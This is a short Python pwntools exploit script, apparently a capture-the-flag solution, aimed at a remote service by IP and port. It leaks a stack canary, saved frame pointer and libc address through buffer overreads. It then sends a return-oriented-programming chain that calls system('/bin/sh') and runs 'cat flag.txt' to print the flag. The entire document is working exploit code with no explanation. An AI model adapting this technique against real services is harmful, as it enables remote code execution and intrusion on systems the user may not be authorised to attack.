#!/usr/bin/python
from pwn import *

#r = process('./hello')
r = remote('140.113.24.241', 30174)
r.send(b'1')
ret = r.recvuntil(b'> ')
'''
payload = b'A'*0x8
r.send(payload)
r.recvuntil(b'A'*0x8)
addr1 = r.recvuntil(b' ', drop=True)
addr1 += b'\x00\x00'
addr1 = u64(addr1)

payload = b'N' + b'A'*0x18
r.send(payload)
r.recvuntil(b'A'*0x18)
addr2 = r.recvuntil(b' ', drop=True)
addr2 += b'\x00\x00'
addr2 = u64(addr2) 
'''
payload = b'A'*0x20
r.send(payload)
r.recvuntil(b'A'*0x20)
addr3 = r.recvuntil(b' ', drop=True)
addr3 += b'\x00\x00'
addr3 = u64(addr3)

payload = b'N' + b'A'*0x29
r.send(payload)
r.recvuntil(b'A'*0x29)
addr = r.recvuntil(b' ', drop=True)
canary = b'\x00'
canary += addr[:7]
rbp_addr = addr[7:]
rbp_addr += b'\x00\x00'


payload = b'N' + b'A'*0x58
r.send(payload)
r.recvuntil(b'A'*0x58)
addr = r.recvuntil(b' ', drop=True)
addr += b'\x00\x00'
libc_base = u64(addr) - 0x29d90
system = libc_base + 0x50d70
binsh = libc_base + 0x1d8678
poprdi = libc_base + 0x2a3e5
poprsi = libc_base + 0x2be51
poprax = libc_base + 0x45eb0
ret = libc_base + 0x29139
exit = libc_base + 0x455f0
payload = b'NABCDEFGH'+ b'AAAAAAAA' + p64(0x31) + b'AAAAAAAA' + p64(addr3) + canary + rbp_addr + p64(ret) + p64(poprdi) + p64(binsh) +  p64(system) + p64(exit)
r.send(payload)
r.recv()
r.send(b'Y')
sleep(1)
r.send(b'cat flag.txt\n')
while True:
    data = r.recv(timeout=1).decode()
    if "FLAG" in data:
        flag_index = data.index("FLAG")
        print(data[flag_index:])
        break
r.close()




